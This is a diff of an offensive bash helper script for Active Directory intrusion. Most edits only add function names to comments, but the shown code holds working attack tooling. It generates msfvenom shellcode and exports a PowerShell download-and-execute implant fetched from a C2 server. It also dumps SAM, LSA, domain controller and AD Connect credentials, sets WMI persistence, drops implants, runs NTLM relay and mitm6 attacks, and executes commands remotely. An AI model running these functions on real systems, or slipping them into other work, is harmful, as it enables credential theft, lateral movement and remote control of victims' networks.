@@ -19,7 +19,7 @@ export PHRASE='';
 
 function showHelp(){
     # DESCRIPTION: Displays helper functions and descriptions.
-    # ARGUMENTS: None.
+    # ARGUMENTS: showHelp None.
     HELP=`cat ${HELPER} | egrep "function|ARGUMENT|DESCRIPTION|SECTION:"|\
         grep -v "HELP"\
         |cut -d' ' -f2-100\
@@ -31,7 +31,7 @@ function showHelp(){
 
 function parseNameDomain(){
     # DESCRIPTION: Parse name and domain from string.
-    # ARGUMENT: VALUE.
+    # ARGUMENT: parseNameDomain VALUE.
     VALUE=$1;
     NAME=`echo ${VALUE}|cut -d':' -f 1`;
     if [[ "$NAME" == *"\\"* ]]; then
@@ -48,7 +48,7 @@ function parseNameDomain(){
 }
 function parseAESHashes(){
     # DESCRIPTION: Parse AES-256 hashes from dumped secrets files.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: parseAESHashes TARGET.
     TARGET=$1;
     FILE=`basename ${TARGET}`;
     FILE=${FILE%.secrets};
@@ -71,7 +71,7 @@ function parseAESHashes(){
 
 function parsePasswords(){
     # DESCRIPTION: Parse passwords from dumped secrets files.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: parsePasswords TARGET.
     TARGET=$1;
     FILE=`basename ${TARGET}`;
     FILE=${FILE%.secrets};
@@ -105,7 +105,7 @@ function parsePasswords(){
 
 function parseNTLMHashes(){
     # DESCRIPTION: Parse NTLM hashes from dumped sam and secrets files.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: parseNTLMHashes TARGET.
     TARGET=$1;
     FILE=`basename ${TARGET}`;
     if [[ "$FILE" == *".sam"* ]]; then
@@ -133,7 +133,7 @@ function parseNTLMHashes(){
 
 function installHelper(){
     # DESCRIPTION: Install dependencies for functions.
-    # ARGUMENT: None.
+    # ARGUMENT: installHelper None.
     git clone https://github.com/dirkjanm/adidnsdump.git /opt/
     git clone https://github.com/fox-it/adconnectdump.git /opt/
     git clone https://github.com/Hackplayers/evil-winrm.git /opt/
@@ -151,7 +151,7 @@ function installHelper(){
 
 function logSession(){
     # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
-    # ARGUMENT: LOGNAME.
+    # ARGUMENT: logSession LOGNAME.
     LOGNAME=$1;
     screen -S sessionlogging -L -Logfile /var/log/$(date +"${LOGNAME}_session_%d_%m_%y_%H%M.log");
     return;
@@ -159,14 +159,14 @@ function logSession(){
 
 function stopLoggingSession(){
     # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
-    # ARGUMENT: LOGNAME.
+    # ARGUMENT: stopLoggingSession None.
     pkill screen;
     return;
 }
 
 function encryptFile(){
     # DESCRIPTION: Encrypt file using AES-256-CBC and password.
-    # ARGUMENT: FILEIN, FILEOUT, PASS.
+    # ARGUMENT: encryptFile FILEIN, FILEOUT, PASS.
     FILEIN=$1;
     FILEOUT=$2;
     PASS=$3;
@@ -181,7 +181,7 @@ function encryptFile(){
 
 function decryptFile(){
     # DESCRIPTION: Decrypt AES-256-CBC encrypted file using password.
-    # ARGUMENT: FILEIN, FILEOUT, PASS.
+    # ARGUMENT: decryptFile FILEIN, FILEOUT, PASS.
     FILEIN=$1;
     FILEOUT=$2;
     PASS=$3;
@@ -196,7 +196,7 @@ function decryptFile(){
 
 function googleSearch(){
     # DESCRIPTION: Quick Google search against domains for strings/terms.
-    # ARGUMENT: DOMAINS, TERMS.
+    # ARGUMENT: googleSearch DOMAINS, TERMS.
     DOMAINS=$1;
     TERMS=$2;
     googlesearch --domains=${DOMAINS} --all ${TERMS};
@@ -205,7 +205,7 @@ function googleSearch(){
 
 function encodePayload(){
     # DESCRIPTION: Encodes PowerShell payloads into Base64 UTF-16 format.
-    # ARGUMENT: PAYLOAD.
+    # ARGUMENT: encodePayload PAYLOAD.
     PAYLOAD=$1
     echo $PAYLOAD | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n";
     return;
@@ -213,18 +213,18 @@ function encodePayload(){
 
 function implantShellcode(){
     # DESCRIPTION: Generates x64 shellcode for PS implants.
-    # ARGUMENT: None.
+    # ARGUMENT: implantShellcode None.
     msfvenom -a x64 \
         --platform windows \
         -p windows/x64/exec \
-        cmd="powershell \"iex(new-object net.webclient).downloadstring('http://${C2SERVER}/${IMPLANT}')\"" \
+        cmd="powershell \"iex(new-object net.webclient).downloadstring('${C2SERVER}/${IMPLANT}')\"" \
         -f  powershell;
     return;
 }
 
 function encodeHash(){
     # DESCRIPTION: Encodes plaintext passwords into NTLM hash format.
-    # ARGUMENT: PASS.
+    # ARGUMENT: encodeHash PASS.
     PASS=$1;
     printf \
     "import hashlib,binascii;print(binascii.hexlify(hashlib.new('md4','${PASS}'.encode('utf-16le')).digest()))" \
@@ -234,7 +234,7 @@ function encodeHash(){
 
 function setVariables(){
     # DESCRIPTION: Sets global environment variables for credentials and domain settings.
-    # ARGUMENT: None.
+    # ARGUMENT: setVariables None.
     export IMPLANT="powershell -exec bypass -c iex((new-object net.webclient).downloadstring('${C2SERVER}/${IMPLANT}'))";
     export DOMAINUSER="${DOMAIN}/${USER}";
     export HASH=`encodeHash ${PASSWORD}`;
@@ -244,7 +244,7 @@ function setVariables(){
 
 function setUserByPassword(){
     # DESCRIPTION: Set current domain user by password.
-    # ARGUMENT: USER, DOMAIN, PASSWORD.
+    # ARGUMENT: setUserByPassword USER, DOMAIN, PASSWORD.
     export USER=$1;
     export DOMAIN=$2;
     export PASSWORD=$3;
@@ -255,7 +255,7 @@ function setUserByPassword(){
 
 function setLocalUserByPassword(){
     # DESCRIPTION: Set current local user by password.
-    # ARGUMENT: USER, PASSWORD, TARGET.
+    # ARGUMENT: setLocalUserByPassword USER, PASSWORD, TARGET.
     export USER=$1;
     export PASSWORD=$2;
     export TARGET=$3;
@@ -268,7 +268,7 @@ function setLocalUserByPassword(){
 
 function setUserByHash(){
     # DESCRIPTION: Set current domain user by hash.
-    # ARGUMENT: USER, DOMAIN, HASH.
+    # ARGUMENT: setUserByHash USER, DOMAIN, HASH.
     export USER=$1;
     export DOMAIN=$2;
     setVariables;
@@ -285,7 +285,7 @@ function setUserByHash(){
 
 function setLocalUserByHash(){
     # DESCRIPTION: Set current local user by hash.
-    # ARGUMENT: USER, HASH, TARGET.
+    # ARGUMENT: setLocalUserByHash USER, HASH, TARGET.
     export USER=$1;
     export TARGET=$3;
     setVariables;
@@ -306,7 +306,7 @@ function setLocalUserByHash(){
 
 function digDump(){
     # DESCRIPTION: Perform dig queries on gd, ldap, kerberos, kpasswd, and any.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: digDump TARGET.
     TARGET=$1;
     proxychains \
     dig -t SRV _gc._tcp.${TARGET};
@@ -323,7 +323,7 @@ function digDump(){
 
 function dhcpBroadcastScan(){
     # DESCRIPTION: Scan DHCP broadcast for IPv4 and IPv6
-    # ARGUMENT: None.
+    # ARGUMENT: dhcpBroadcastScan None.
     nmap -v -oA "broadcast_dhcp" \
     --script broadcast-dhcp-discover;
     nmap -v -oA "broadcast_dhcp6" \
@@ -333,7 +333,7 @@ function dhcpBroadcastScan(){
 
 function whoisARIN(){
     # DESCRIPTION: Perform whois query of IP against ARIN.
-    # ARGUMENT: IPADDRESS.
+    # ARGUMENT: whoisARIN IPADDRESS.
     IPADDRESS=$1;
     proxychains \
     whois -h whois.arin.net $IPADDRESS;
@@ -342,7 +342,7 @@ function whoisARIN(){
 
 function dsNslookup(){
     # DESCRIPTION: LDAP and Kerberos internal DNS lookup.
-    # ARGUMENT: TARGET, NSERVER.
+    # ARGUMENT: dsNslookup TARGET, NSERVER.
     TARGET=$1;
     NSERVER=$2;
     proxychains \
@@ -354,7 +354,7 @@ function dsNslookup(){
 
 function dnsRecon(){
     # DESCRIPTION: DNS recon query against target NS and domain.
-    # ARGUMENT: TARGET, NSERVER.
+    # ARGUMENT: dnsRecon TARGET, NSERVER.
     TARGET=$1;
     NSERVER=$2;
     proxychains \
@@ -364,7 +364,7 @@ function dnsRecon(){
 
 function ldapQuery(){
     # DESCRIPTION: Unauthenticated LDAP query for objectClass=*
-    # ARGUMENT: TARGET.
+    # ARGUMENT: ldapQuery TARGET.
     TARGET=$1;
     proxychains \
     ldapsearch -LLL -x \
@@ -374,7 +374,7 @@ function ldapQuery(){
 
 function pingSweeps(){
     # DESCRIPTION: Ping sweep of target list with random data.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: pingSweeps TARGET.
     TARGET=$1;
      nmap -oA "${TARGET}_ping_sweep_list" -v -T 3 \
         -PP --data "\x41\x41" -n -sn -iL $TARGET;
@@ -383,7 +383,7 @@ function pingSweeps(){
 
 function pingSweep(){
     # DESCRIPTION: Ping single target using random data.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: pingSweep TARGET.
     TARGET=$1;
      nmap -oA "${TARGET}_ping_sweep" -v -T 3 \
         -PP --data "\x41\x41" -n -sn $TARGET;
@@ -392,7 +392,7 @@ function pingSweep(){
 
 function scanSMBSettings(){
     # DESCRIPTION: Scan target list for SMBv1 and SMBv2 security settings.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: scanSMBSettings TARGET.
     TARGET=$1;
     proxychains \
     nmap -v -Pn -sT \
@@ -405,7 +405,7 @@ function scanSMBSettings(){
 
 function fingerPrintSMBHTTP(){
     # DESCRIPTION: Scan target list for SMB and HTTP/HTTPS services.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: fingerPrintSMBHTTP TARGET.
     TARGET=$1;
     proxychains \
     nmap -v -Pn -sT -sV -T 3 \
@@ -417,7 +417,7 @@ function fingerPrintSMBHTTP(){
 
 function serviceScan(){
     # DESCRIPTION: Scan target list for recon/RCE services (DNS, RPC, SMB, HTTP, RDP, LDAP, WinRM, SCM, MSSQL).
-    # ARGUMENT: TARGET.
+    # ARGUMENT: serviceScan TARGET.
     TARGET=$1;
     proxychains \
     nmap -v -T 4 -Pn -sT \
@@ -429,7 +429,7 @@ function serviceScan(){
 
 function dnsSrvEnum(){
     # DESCRIPTION: DNS server enumeration against target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dnsSrvEnum TARGET.
     TARGET=$1;
     proxychains \
     nmap -v -Pn -sT -oA "${TARGET}_dns_srv_enum" \
@@ -440,7 +440,7 @@ function dnsSrvEnum(){
 
 function dnsScan(){
     # DESCRIPTION: Scan target for TCP/UDP DNS services.
-    # ARGUMENT: TARGET.
+    # ARGUMENT:dnsScan TARGET.
     TARGET=$1;
     proxychains \
     nmap -v -Pn -sT -oA "${TARGET}_dns_scan" --open -p T:53,U:53 -T 3 $TARGET;
@@ -449,7 +449,7 @@ function dnsScan(){
 
 function dnsBroadcastDiscovery(){
     # DESCRIPTION: Scan local network for DNS broadcast on TCP/UDP.
-    # ARGUMENT: None.
+    # ARGUMENT: dnsBroadcastDiscovery None.
     nmap -v -oA "dns_broadcast" \
     --script broadcast-dns-service-discovery -p T:53,U:53;
     return;
@@ -457,7 +457,7 @@ function dnsBroadcastDiscovery(){
 
 function getInterfaces(){
     # DESCRIPTION: Scan target for RPC/DCOM interfaces.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getInterfaces TARGET.
     TARGET=$1;
     proxychains ifmap.py $TARGET 135;
     return;
@@ -465,7 +465,7 @@ function getInterfaces(){
 
 function dumpRPC(){
     # DESCRIPTION: Dump target RPC/DCOM information.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dumpRPC TARGET.
     TARGET=$1;
     proxychains rpcdump.py -port 135 $TARGET;
     return;
@@ -473,7 +473,7 @@ function dumpRPC(){
 
 function dumpSAMR(){
     # DESCRIPTION: Scan target SAMR user information.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dumpSAMR TARGET.
     TARGET=$1;
     proxychains samrdump.py -no-pass $TARGET;
     return;
@@ -481,7 +481,7 @@ function dumpSAMR(){
 
 function dumpSIDs(){
     # DESCRIPTION: Scan target SID information.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dumpSIDs TARGET.
     TARGET=$1;
     proxychains lookupsid.py \
     -domain-sids -no-pass $TARGET;
@@ -492,7 +492,7 @@ function dumpSIDs(){
 
 function adDNSDump(){
     # DESCRIPTION: Perform ADIDNS dump of zones using domain user or computer hash or plaintext.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: adDNSDump TARGET.
     TARGET=$1;
     proxychains \
     adidnsdump --print-zones \
@@ -504,7 +504,7 @@ function adDNSDump(){
 
 function runBloodhound(){
     # DESCRIPTION: Run Bloodhound ingestor on target domain controllers.
-    # ARGUMENT: TARGET, TDOMAIN.
+    # ARGUMENT: runBloodhound TARGET, TDOMAIN.
     TARGET=$1;
     TDOMAIN=$2;
     proxychains \
@@ -517,7 +517,7 @@ function runBloodhound(){
 
 function getSPNs(){
     # DESCRIPTION: Save SPNs from target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getSPNs TARGET.
     TARGET=$1;
     proxychains \
     GetUserSPNs.py \
@@ -530,7 +530,7 @@ function getSPNs(){
 
 function getNPUsers(){
     # DESCRIPTION: Save target NP user details.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getNPUsers TARGET.
     TARGET=$1;
     proxychains \
     GetNPUsers.py "${DOMAIN}/${TARGET}" \
@@ -540,7 +540,7 @@ function getNPUsers(){
 
 function checkLocalAdmin(){
     # DESCRIPTION: Check target for local admin privileges.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: checkLocalAdmin TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -559,7 +559,7 @@ function checkLocalAdmin(){
 
 function wmiSurvey(){
     # DESCRIPTION: Run WMI survey on remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: wmiSurvey TARGET.
     TARGET=$1;
     printf "
     select Caption,Description, HotFixID, InstalledOn from Win32_QuickFixEngineering;
@@ -596,7 +596,7 @@ function wmiSurvey(){
 
 function wmiQuery(){
     # DESCRIPTION: Run WMI query on remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: wmiQuery TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -615,7 +615,7 @@ function wmiQuery(){
 
 function registryQuery(){
     # DESCRIPTION: Run registry query on remote target.
-    # ARGUMENT: TARGET, QUERY.
+    # ARGUMENT: registryQuery TARGET, QUERY.
     TARGET=$1;
     QUERY=$2;
     if [[ -z "$DOMAIN" ]]
@@ -637,7 +637,7 @@ function registryQuery(){
 
 function serviceQuery(){
     # DESCRIPTION: Run service query on remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: serviceQuery TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -656,7 +656,7 @@ function serviceQuery(){
 
 function huntProcess(){
     # DESCRIPTION: Hunt user processes on remote target.
-    # ARGUMENT: TARGET, COMPUTER.
+    # ARGUMENT: huntProcess TARGET, COMPUTER.
     TARGET=$1;
     COMPUTER=$2;
     proxychains \
@@ -670,7 +670,7 @@ function huntProcess(){
 
 function getProcess(){
     # DESCRIPTION: Scan remote target for processes.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getProcess TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netprocess -w $DOMAIN -u $USER \
@@ -681,7 +681,7 @@ function getProcess(){
 
 function getSessions(){
     # DESCRIPTION: Scan remote target for SMB sessions.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getSessions TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netsession -w $DOMAIN -u $USER \
@@ -692,7 +692,7 @@ function getSessions(){
 
 function getShares(){
     # DESCRIPTION: Scan remote target for SMB shares.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getShares TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netshare -w $DOMAIN -u $USER \
@@ -703,7 +703,7 @@ function getShares(){
 
 function huntUser(){
     # DESCRIPTION: Scan for users on remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: huntUser TARGET.
     TARGET=$1;
     proxychains \
     pywerview invoke-userhunter -w $DOMAIN -u $USER \
@@ -715,7 +715,7 @@ function huntUser(){
 
 function getGroupMember(){
     # DESCRIPTION: Scan group membership on target groups.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getGroupMember TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netgroupmember -w $DOMAIN -u $USER \
@@ -725,7 +725,7 @@ function getGroupMember(){
 
 function getGroups(){
     # DESCRIPTION: Scan groups on targets.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getGroups TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netgroup -w $DOMAIN -u $USER \
@@ -735,7 +735,7 @@ function getGroups(){
 
 function getGroup(){
     # DESCRIPTION: Scan for target groups.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getGroup TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netgroup -w $DOMAIN -u $USER \
@@ -745,7 +745,7 @@ function getGroup(){
 
 function getLoggedOn(){
     # DESCRIPTION: Scan remote targets for logged on users.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getLoggedOn TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netloggedon -w $DOMAIN -u $USER \
@@ -755,7 +755,7 @@ function getLoggedOn(){
 
 function getDomainPolicy(){
     # DESCRIPTION: Scan domain group/password policy.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getDomainPolicy TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-domainpolicy -w $DOMAIN -u $USER \
@@ -766,7 +766,7 @@ function getDomainPolicy(){
 
 function getComputer(){
     # DESCRIPTION: Scan for computer in target domain.
-    # ARGUMENT: TARGET, TDOMAIN.
+    # ARGUMENT: getComputer TARGET, TDOMAIN.
     TARGET=$1;
     TDOMAIN=$2;
     proxychains \
@@ -779,7 +779,7 @@ function getComputer(){
 
 function getFullComputers(){
     # DESCRIPTION: Scan for full computer details in target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getFullComputers TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netcomputer -w $DOMAIN -u $USER \
@@ -791,7 +791,7 @@ function getFullComputers(){
 
 function getComputers(){
     # DESCRIPTION: Scan for computer hostnames in target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getComputers TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netcomputer -w $DOMAIN -u $USER \
@@ -802,7 +802,7 @@ function getComputers(){
 
 function getDelegation(){
     # DESCRIPTION: Scan for user and computer delegation in target domains.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getDelegation TARGET.
     TARGET=$1;
     proxychains \
     findDelegation.py \
@@ -814,7 +814,7 @@ function getDelegation(){
 
 function getUnconstrainedUsers(){
     # DESCRIPTION: Scan for unconstrained users in target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getUnconstrainedUsers TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netuser -w $DOMAIN -u $USER \
@@ -825,7 +825,7 @@ function getUnconstrainedUsers(){
 
 function getUnconstrainedComputers(){
     # DESCRIPTION: Scan for unconstrained computers on target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getUnconstrainedComputers TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netcomputer -w $DOMAIN -u $USER \
@@ -836,7 +836,7 @@ function getUnconstrainedComputers(){
 
 function getUser(){
     # DESCRIPTION: Scan for user details in target domain.
-    # ARGUMENT: TARGET, TDOMAIN.
+    # ARGUMENT: getUser TARGET, TDOMAIN.
     TARGET=$1;
     TDOMAIN=$2;
     proxychains \
@@ -848,7 +848,7 @@ function getUser(){
 
 function getUsers(){
     # DESCRIPTION: Scan for users in target domain.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: getUsers TARGET.
     TARGET=$1;
     proxychains \
     pywerview get-netuser \
@@ -860,7 +860,7 @@ function getUsers(){
 
 function rulerCheck(){
     # DESCRIPTION: Query Exchange form for remote user.
-    # ARGUMENT: EMAIL.
+    # ARGUMENT: rulerCheck EMAIL.
     EMAIL=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -885,7 +885,7 @@ function rulerCheck(){
 
 function rulerDelete(){
     # DESCRIPTION: Delete Exchange form for remote user.
-    # ARGUMENT: EMAIL.
+    # ARGUMENT: rulerDelete EMAIL.
     EMAIL=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -912,7 +912,7 @@ function rulerDelete(){
 
 function winRMShell(){
     # DESCRIPTION: WinRM/PSRP shell on target system.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: winRMShell TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -931,7 +931,7 @@ function winRMShell(){
 
 function wmiShell(){
     # DESCRIPTION: WMI shell on target system.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: wmiShell TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -950,7 +950,7 @@ function wmiShell(){
 
 function smbShell(){
     # DESCRIPTION: SMB shell on target system.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: smbShell TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -971,7 +971,7 @@ function smbShell(){
 
 function wmiCommandOutput(){
     # DESCRIPTION: Execute WMI command without output on target system.
-    # ARGUMENT: TARGET, COMMAND.
+    # ARGUMENT: wmiCommandOutput TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
     if [[ -z "$DOMAIN" ]]
@@ -991,7 +991,7 @@ function wmiCommandOutput(){
 
 function wmiCommand(){
     # DESCRIPTION: Execute WMI command without output on target system.
-    # ARGUMENT: TARGET, COMMAND.
+    # ARGUMENT: wmiCommand TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
     if [[ -z "$DOMAIN" ]]
@@ -1013,7 +1013,7 @@ function wmiCommand(){
 
 function psexecCommand(){
     # DESCRIPTION: Execute PSexec command on target system.
-    # ARGUMENT: TARGET, COMMAND.
+    # ARGUMENT: psexecCommand TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
     if [[ -z "$DOMAIN" ]]
@@ -1033,7 +1033,7 @@ function psexecCommand(){
 
 function atCommand(){
     # DESCRIPTION: Execute AT/scheduled task on target system.
-    # ARGUMENT: TARGET, COMMAND.
+    # ARGUMENT: atCommand TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
     if [[ -z "$DOMAIN" ]]
@@ -1053,7 +1053,7 @@ function atCommand(){
 
 function dcomCommand(){
     # DESCRIPTION: Execute RPC/DCOM command on target system.
-    # ARGUMENT: TARGET, COMMAND.
+    # ARGUMENT: dcomCommand TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
     if [[ -z "$DOMAIN" ]]
@@ -1075,7 +1075,7 @@ function dcomCommand(){
 
 function rulerCommand(){
     # DESCRIPTION: Execute Exchange form against remote user.
-    # ARGUMENT: EMAIL, PAYLOAD.
+    # ARGUMENT: rulerCommand EMAIL, PAYLOAD.
     EMAIL=$1;
     PAYLOAD=$2;
     if [[ -z "$DOMAIN" ]]
@@ -1107,29 +1107,29 @@ function rulerCommand(){
 
 function mountSSHShare(){
     # DESCRIPTION: Mount remote SSH share on ssh_share directory.
-    # ARGUMENT: TUSER, TARGET, SHARE.
+    # ARGUMENT: mountSSHShare TUSER, TARGET, SHARE.
     TUSER=$1;
     TARGET=$2;
     SHARE=$3;
-    mkdir ./ssh_share;
-    proxychains sshfs "${TUSER}"@"${TARGET}:/${SHARE}" ./ssh_share;
+    mkdir ./${TARGET};
+    proxychains sshfs "${TUSER}"@"${TARGET}:/${SHARE}" ./${TARGET};
     return;
 }
 
 function mountShare(){
     # DESCRIPTION: Mount remote SMB share on tmpshare directory.
-    # ARGUMENT: TARGET, SHARE.
+    # ARGUMENT: mountShare TARGET, SHARE.
     TARGET=$1;
     SHARE=$2;
-    mkdir ./tmpshare;
-    mount -t cifs "//${TARGET}/${SHARE}" ./tmpshare \
+    mkdir ./${TARGET};
+    mount -t cifs "//${TARGET}/${SHARE}" ./${TARGET} \
     -o username=${USER},password=${PASSWORD},domain=${DOMAIN},iocharset=utf8,file_mode=0777,dir_mode=0777;
     return;
 }
 
 function mssqlConnect(){
     # DESCRIPTION: Connect to remote MSSQL database.
-    # ARGUMENT: TARGET, DB, PORT.
+    # ARGUMENT: mssqlConnect TARGET, DB, PORT.
     TARGET=$1;
     DB=$2
     PORT=$3;
@@ -1151,7 +1151,7 @@ function mssqlConnect(){
 
 function smbConnect(){
     # DESCRIPTION: Connect to remote SMB share.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: smbConnect TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -1172,7 +1172,7 @@ function smbConnect(){
 
 function localPortForward(){
     # DESCRIPTION: Spin up local port forward
-    # ARGUMENT: LPORT, RPORT.
+    # ARGUMENT: localPortForward LPORT, RPORT.
     LPORT=$1;
     RPORT=$2;
     socat TCP-LISTEN:${LPORT},bind=vmkali,fork,reuseaddr \
@@ -1182,21 +1182,21 @@ function localPortForward(){
 
 function localProxy(){
     # DESCRIPTION: Spin up local SOCKS proxy on port 1080.
-    # ARGUMENT: None.
+    # ARGUMENT: localProxy None.
     ssh -f -N -D vmkali:1080 root@bigkali;
     return;
 }
 
 function httpServer(){
     # DESCRIPTION: Spin up local HTTP server on port 80.
-    # ARGUMENT: None.
+    # ARGUMENT: httpServer None.
     python -m SimpleHTTPServer 80;
     return;
 }
 
 function smbServer(){
     # DESCRIPTION: Spin up local SMB server in current folder on port 445.
-    # ARGUMENT: IPADDRESS.
+    # ARGUMENT: smbServer IPADDRESS.
     IPADDRESS=$1;
     smbserver.py -ip $IPADDRESS \
         -port 445 -smb2support PWN ./ ;
@@ -1205,7 +1205,7 @@ function smbServer(){
 
 function socksProxy(){
     # DESCRIPTION: Spin up dynamic SOCKS proxy.
-    # ARGUMENT: LHOST, LPORT, RUSER, RHOST.
+    # ARGUMENT: socksProxy LHOST, LPORT, RUSER, RHOST.
     LHOST=$1;
     LPORT=$2;
     RUSER=$3;
@@ -1218,7 +1218,7 @@ function socksProxy(){
 
 function dumpADConnect(){
     # DESCRIPTION: Dump AD Sync credentials on remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dumpADConnect TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -1239,7 +1239,7 @@ function dumpADConnect(){
 
 function dumpDCOnly(){
     # DESCRIPTION: Dump DC hashes only using KRBCCACHE TGT.
-    # ARGUMENT: DCFQDN.
+    # ARGUMENT: dumpDCOnly DCFQDN.
     DCFQDN=$1;
     proxychains \
             secretsdump.py \
@@ -1250,7 +1250,7 @@ function dumpDCOnly(){
 
 function dumpSAM(){
     # DESCRIPTION: Dump SAM and LSA secrets on remote host.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dumpSAM TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -1271,7 +1271,7 @@ function dumpSAM(){
 
 function wmiPersist(){
     # DESCRIPTION: WMI persistence on remote target.
-    # ARGUMENT: TARGET, PAYLOAD.
+    # ARGUMENT: wmiPersist TARGET, PAYLOAD.
     TARGET=$1;
     PAYLOAD=$2;
     if [[ -z "$DOMAIN" ]]
@@ -1295,7 +1295,7 @@ function wmiPersist(){
 
 function removeWmiPersist(){
     # DESCRIPTION: Remove WMI persistence on remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: removeWmiPersist TARGET.
     TARGET=$1;
     if [[ -z "$DOMAIN" ]]
     then
@@ -1318,7 +1318,7 @@ function removeWmiPersist(){
 
 function oraclePadbust(){
     # DESCRIPTION: Generic oracle padding attack using post and cookie files.
-    # ARGUMENT: URL, ENCDATA, POSTFILE, COOKIEFILE.
+    # ARGUMENT: oraclePadbust URL, ENCDATA, POSTFILE, COOKIEFILE.
     URL=$1;
     ENCDATA=$2;
     POSTFILE=$3;
@@ -1346,7 +1346,7 @@ function oraclePadbust(){
 
 function dropImplant(){
     # DESCRIPTION: Drop implant on remote target using WMI.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: dropImplant TARGET.
     TARGET=$1;
     wmiCommand $TARGET $IMPLANT;
     return;
@@ -1354,7 +1354,7 @@ function dropImplant(){
 
 function ultraRelay(){
     # DESCRIPTION: NTML (NTLM back to host) relay via Java applet.
-    # ARGUMENT: ATTACKERIP.
+    # ARGUMENT: ultraRelay ATTACKERIP.
     ATTACKERIP=$1;
     python ultrarelay.py \
     -ip ${ATTACKERIP};
@@ -1363,7 +1363,7 @@ function ultraRelay(){
 
 function mitm6DHCP(){
     # DESCRIPTION: MITM attack using IPv6 to IPv4 WPAD.
-    # ARGUMENT: DOMAIN, IP4ADD, IP6ADD, MACADD.
+    # ARGUMENT: mitm6DHCP DOMAIN, IP4ADD, IP6ADD, MACADD.
     DOMAIN=$1;
     IP4ADD=$2;
     IP6ADD=$3;
@@ -1378,7 +1378,7 @@ function mitm6DHCP(){
 
 function ntlmRelayDelegate(){
     # DESCRIPTION: NTLM relay attack using delegation vectors.
-    # ARGUMENT: TCOMPUTER, TSERVER, WPAD.
+    # ARGUMENT: ntlmRelayDelegate TCOMPUTER, TSERVER, WPAD.
     TCOMPUTER=$1;
     TSERVER=$2;
     WPAD=$3;
@@ -1391,7 +1391,7 @@ function ntlmRelayDelegate(){
 
 function removeComputer(){
     # DESCRIPTION: Remove computer from AD domain.
-    # ARGUMENT: TCOMPUTER, TPASSWORD, TGROUP.
+    # ARGUMENT: removeComputer TCOMPUTER, TPASSWORD, TGROUP.
     TCOMPUTER=$1;
     TPASSWORD=$2;
     TGROUP=$3;
@@ -1407,7 +1407,7 @@ function removeComputer(){
 
 function addComputer(){
     # DESCRIPTION: Add computer to AD domain.
